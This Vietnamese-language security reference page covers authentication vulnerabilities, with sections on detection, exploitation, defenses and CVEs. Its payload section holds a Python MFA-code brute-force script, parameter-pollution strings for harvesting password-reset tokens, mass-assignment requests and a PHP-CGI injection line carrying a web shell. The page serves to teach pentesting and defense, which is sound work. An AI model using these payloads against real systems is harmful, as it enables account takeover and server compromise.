# Authentication Vulnerabilities

> Đăng nhập, MFA, hoặc xử lý thông tin xác thực yếu cho phép kẻ tấn công chiếm tài khoản. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/authentication.md`](../../../../Troubleshooting_Guide/authentication.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** A07:2021 Identification & Authentication Failures
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
Lỗ hổng xác thực là những thiếu sót trong cách ứng dụng xác minh danh tính, cho phép kẻ tấn công
vượt qua đăng nhập hoặc mạo danh người dùng khác. Chúng trải dài từ chính sách thông tin xác thực yếu,
thiếu giới hạn tốc độ, luồng đa yếu tố bị lỗi, đến lỗi logic trong đăng ký, đặt lại mật khẩu, hoặc
cấp phát phiên.

## Cơ chế hoạt động (How it works)
Kẻ tấn công kiểm soát các đầu vào của luồng xác thực — tên người dùng, mật khẩu, mã MFA, token
đặt lại, và các tham số request. Ứng dụng tin tưởng những thứ này quá dễ dàng: nó tiết lộ những
tài khoản nào tồn tại qua thông báo lỗi hoặc thời gian phản hồi khác biệt, không hạn chế việc đoán,
cho phép người dùng bỏ qua hoặc phát lại một bước MFA, hoặc gắn các trường do kẻ tấn công cung cấp
(`role`, `isAdmin`) lẽ ra phải bỏ qua. Server-Side Parameter Pollution còn cho phép các ký tự `&`/`#`
được chèn vào viết lại query mà backend chuyển tiếp tới một API nội bộ, nên một yêu cầu đặt lại cho
nạn nhân lại trả về cho kẻ tấn công một token dùng được.

## Tác động (Impact)
Chiếm hoàn toàn tài khoản, bao gồm cả tài khoản có giá trị cao hoặc tài khoản quản trị, với toàn bộ
quyền truy cập và dữ liệu mà danh tính đó mang theo. Vì xác thực là cổng dẫn tới mọi thứ khác, mức độ
nghiêm trọng thường là cao đến nghiêm trọng; một lần vượt qua duy nhất có thể xâm hại mọi tài khoản
trên nền tảng.

## Cách phát hiện (How to detect)
- Phản hồi đăng nhập khác nhau giữa tên người dùng hợp lệ và không hợp lệ (văn bản, mã trạng thái, hoặc
  thời gian phản hồi) — một tín hiệu liệt kê tên người dùng.
- Không khóa hoặc không giới hạn tốc độ sau nhiều lần sai mật khẩu hoặc mã MFA.
- Các bước MFA có thể bị bỏ qua, đảo thứ tự, hoặc brute-force (mã số ngắn, không hạn chế).
- Phản hồi đặt lại mật khẩu hoặc quên mật khẩu thay đổi khi các tham số `&field=...%23` bổ sung
  được chèn vào, hoặc phản chiếu lại một token/email.
- Các API chấp nhận các trường JSON bổ sung, các động từ HTTP ẩn (`PATCH`/`DELETE` qua `OPTIONS`), hoặc
  các route phiên bản cũ bỏ qua các kiểm tra mới hơn.

## Khai thác (tóm tắt) (Exploitation)
Liệt kê các tên người dùng hợp lệ từ khác biệt về lỗi/thời gian, rồi spray hoặc brute-force mật khẩu
ở nơi không có giới hạn tốc độ. Ở nơi MFA yếu, brute-force mã ngắn hoặc bỏ qua hoàn toàn bước thứ hai.
Lạm dụng Server-Side Parameter Pollution trên các luồng đặt lại để thu hoạch token đặt lại của nạn nhân,
và dùng mass assignment để tự cấp cho mình một `role` đặc quyền. Payload và script đầy đủ
nằm ở mục Payload phía dưới.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Liệt kê tên người dùng & brute force thông tin xác thực (Username enumeration & credential brute force)
Khác biệt thông báo lỗi tiết lộ liệu một tên người dùng có tồn tại; nối việc liệt kê vào một đợt password spray.

```http
POST /login
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrongpassword
```

- "Invalid username" so với một lỗi khác (ví dụ "Incorrect password") tiết lộ các tài khoản hợp lệ.
- Một khi đã xác nhận tên người dùng, brute-force mật khẩu từ một wordlist; thành công thể hiện qua việc không còn lỗi "Incorrect password" hoặc một redirect.

### Brute force 2FA / MFA (2FA / MFA brute force)
Các mã số ngắn không có giới hạn tốc độ có thể đoán cạn kiệt. Một redirect 302 tới `/my-account` đánh dấu lần trúng.

```http
POST /login2
Content-Type: application/x-www-form-urlencoded

csrf=<csrf>&mfa-code=0000
```

```python
import requests
from bs4 import BeautifulSoup

URL = "https://target.web-security-academy.net"
s = requests.Session()

def login():
    r = s.get(f"{URL}/login")
    csrf = BeautifulSoup(r.text, "html.parser").find("input", {"name": "csrf"})["value"]
    s.post(f"{URL}/login", data={"csrf": csrf, "username": "carlos", "password": "montoya"})
    r = s.get(f"{URL}/login2")
    return BeautifulSoup(r.text, "html.parser").find("input", {"name": "csrf"})["value"]

for i in range(10000):
    if i % 2 == 0:
        csrf = login()
    r = s.post(f"{URL}/login2", data={"csrf": csrf, "mfa-code": str(i).zfill(4)}, allow_redirects=False)
    if r.status_code == 302 and "/my-account" in r.headers.get("Location", ""):
        print(f"Code found: {str(i).zfill(4)}")
        break
```

### Server-Side Parameter Pollution (SSPP)
Chèn các tham số bổ sung vào một giá trị mà server chuyển tiếp tới một API nội bộ. `%26` chèn `&`, `%23` cắt cụt bằng `#`.

```http
username=administrator%26x=y           # inject &x=y
username=administrator%23              # truncate query string with #
username=administrator%26field=email%23
username=administrator%26field=reset_token%23
username=administrator%26field=password%23
username=administrator%26field=passwordResetToken%23
```

SSPP dựa trên REST/đường dẫn cắt cụt hoặc traverse đường dẫn được chuyển tiếp:

```http
username=administrator#                       # truncate path
username=administrator?                        # confirm path placement
username=./administrator                       # relative path
username=../administrator                      # parent directory
username=../../../../#                          # find API root
username=../../../../openapi.json#
username=administrator/field/email#
username=administrator/field/passwordResetToken#
username=../../v1/users/administrator/field/passwordResetToken#
```

**Luồng khai thác:** post `username=<target>%26field=<field>%23` tới `/forgot-password`, trích xuất token hex 32 ký tự từ phản hồi, đặt lại mật khẩu, rồi đăng nhập.

### Khám phá tài liệu API & endpoint (API documentation & endpoint discovery)
Cắt cụt các đường dẫn để lần ngược về tài liệu, rồi lập bản đồ cấu trúc.

```http
GET /api/user/wiener   -> 200
GET /api/user          -> reveals structure
GET /api               -> documentation
```

Các đường dẫn tài liệu phổ biến:

```text
/api, /api/v1, /api/v2, /api/v3
/api/docs, /api/swagger, /api/redoc
/swagger.json, /swagger.yaml, /openapi.json, /openapi.yaml
/graphql, /api/graphql
/.well-known/openapi.json
```

### Các phương thức HTTP không dùng / ẩn (Unused / hidden HTTP methods)
Liệt kê các động từ được chấp nhận, rồi lạm dụng chúng cho các thao tác ghi trái phép.

```http
OPTIONS /api/products/3/price          # check Allow header
```

```http
PATCH /api/products/3/price
Content-Type: application/json

{"price": 0}
```

```http
DELETE /api/user/carlos
```

### Mass assignment
Gửi các trường đặc quyền ẩn mà API gắn vào mà không lọc.

```json
POST /api/users/register
{
  "username": "attacker",
  "password": "pass123",
  "email": "attacker@evil.com",
  "role": "admin",
  "isAdmin": true
}
```

```json
POST /api/checkout
{
  "chosen_discount": {"percentage": 100},
  "chosen_products": [{"product_id": "1", "quantity": 1}]
}
```

```json
POST /api/orders
{
  "items": [{"id": 1, "qty": 2}],
  "address": "123 Main St",
  "shipping_cost": 0,
  "tax_amount": 0,
  "is_premium": true
}
```

Các đối tượng lồng nhau có thể giấu các trường đặc quyền bên dưới cấp cao nhất:

```json
POST /api/user/update
{
  "profile": {
    "name": "John",
    "settings": {"notifications": true, "role": "admin"}
  }
}
```

Các trường ẩn thường được gắn: `discount, chosen_discount, percentage, role, isAdmin, is_admin, is_superuser, balance, credits, account_balance, price, cost, shipping_cost, tax_amount, reset_token, passwordResetToken, api_key`.

### Parameter pollution & các cách vượt qua mã hóa (Parameter pollution & encoding bypasses)
Các tham số trùng lặp xung đột được xử lý khác nhau theo từng stack — hữu ích cho việc giả mạo và vượt qua giới hạn tốc độ.

```http
GET /api/transfer?amount=1&from=user1&to=attacker&amount=1000
# PHP/Apache: last value wins (1000)
# ASP.NET: comma-joined (1,1000)
# JSP/Tomcat: first value (1)
```

```json
POST /api/checkout
{"total": 10, "total": 0}
```

```http
username=admin%2526field%253Dtoken%2523
# double-decodes to: admin&field=token#
```

```http
POST /api/forgot-password
username=dummy&user=admin#
# rate limit checks username, backend uses user
```

SSPP mù có thể được xác nhận bằng khác biệt thời gian qua `field=email|password|api_key`.

### GraphQL
Introspect schema, rồi điều khiển mass assignment thông qua các mutation.

```graphql
{ __schema { types { name fields { name type { name } } } } }
```

```graphql
mutation {
  updateUser(input: { name: "John", isAdmin: true, balance: 999999 }) {
    user { id name }
  }
}
```

### Trộn lẫn phiên bản API (API version mixing)
Các phiên bản API cũ hơn có thể bỏ qua các kiểm tra phân quyền mới hơn.

```http
POST /api/users
X-API-Version: 1
```
```text
POST /api/v1/users
POST /api/users?version=1
{"api_version": "1", "data": {...}}
```

### Các mẫu CVE thực tế (Real-world CVE patterns)

| CVE | Sản phẩm | Kỹ thuật |
|-----|---------|-----------|
| CVE-2024-21887 | Ivanti Connect Secure | Vượt xác thực path-traversal qua SSPP |
| CVE-2023-42793 | JetBrains TeamCity | Mass assignment vai trò admin |
| CVE-2024-4577 | PHP CGI | Argument injection |

```http
POST /api/v1/totp/user-backup-code/../../system/user/admin
```

```json
POST /app/rest/users
{"username": "newuser", "password": "pass123", "roles": ["SYSTEM_ADMIN"]}
```

```http
GET /index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input
<?php system($_GET[cmd]); ?>
```

### Tham chiếu nhanh mã hóa URL (URL encoding quick reference)

| Ký tự | Đã mã hóa | Mục đích |
|------|---------|---------|
| `&` | `%26` | Chèn tham số bổ sung |
| `#` | `%23` | Cắt cụt URL/query string |
| `?` | `%3F` | Bắt đầu query string mới |
| `.` | `%2E` | Path traversal |
| `/` | `%2F` | Path traversal |
| `\` | `%5C` | Path traversal (Windows) |

## Phòng chống (Defenses)
1. **Hạn chế và khóa** — giới hạn tốc độ và khóa lũy tiến các endpoint đăng nhập, MFA, và đặt lại;
   thêm CAPTCHA sau các lần thất bại lặp lại.
2. **Phản hồi đồng nhất** — trả về lỗi và thời gian giống hệt nhau giữa tên người dùng hợp lệ và không hợp lệ;
   không bao giờ xác nhận sự tồn tại của tài khoản khi đăng nhập, đăng ký, hoặc đặt lại.
3. **Luồng MFA mạnh** — thực thi yếu tố thứ hai ở phía server, gắn nó với phiên để nó không thể
   bị bỏ qua hoặc đảo thứ tự, dùng mã đủ dài, và làm chúng hết hạn nhanh chóng.
4. **Thông tin xác thực an toàn** — chính sách mật khẩu mạnh, băm chậm có salt (bcrypt/argon2),
   kiểm tra mật khẩu đã rò rỉ, và token đặt lại ngắn dùng một lần.
5. **Gắn theo danh sách cho phép** — chỉ gắn các trường được mong đợi ở phía server để đánh bại mass assignment;
   không bao giờ tin tưởng `role`/`isAdmin` từ client.
6. **Chuẩn hóa và kiểm tra đầu vào** — từ chối hoặc canonicalize các ký tự `&`/`#`/đường dẫn được chèn vào
   trước khi chuyển tiếp tới các API nội bộ để ngăn server-side parameter pollution.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=Authentication+Vulnerabilities
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Authentication+Vulnerabilities
- **Exploit-DB** — https://www.exploit-db.com/search?q=Authentication+Vulnerabilities
- **GitHub Advisories** — https://github.com/advisories?query=Authentication+Vulnerabilities
- **OSV** — https://osv.dev/list?q=Authentication+Vulnerabilities
- **Cộng đồng** — r/netsec, blog bảo mật của nhà cung cấp, HackerOne Hacktivity, X/Twitter infosec.
- _Mẹo tìm kiếm: thêm sản phẩm mục tiêu + phiên bản, ví dụ `Authentication Vulnerabilities <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi dựa vào chi tiết._
- `CVE-2024-21887` — chuỗi vượt xác thực Ivanti Connect Secure qua path traversal (bị khai thác trong thực tế).
- `CVE-2023-42793` — vượt xác thực JetBrains TeamCity cho phép chiếm tài khoản admin.
- `CVE-2022-40684` — vượt xác thực Fortinet FortiOS/FortiProxy trên giao diện admin.

## Tham khảo (References)
- PortSwigger Web Security Academy — Authentication vulnerabilities.
- OWASP — Authentication Cheat Sheet & Forgot Password Cheat Sheet.
- OWASP — A07:2021 Identification and Authentication Failures.
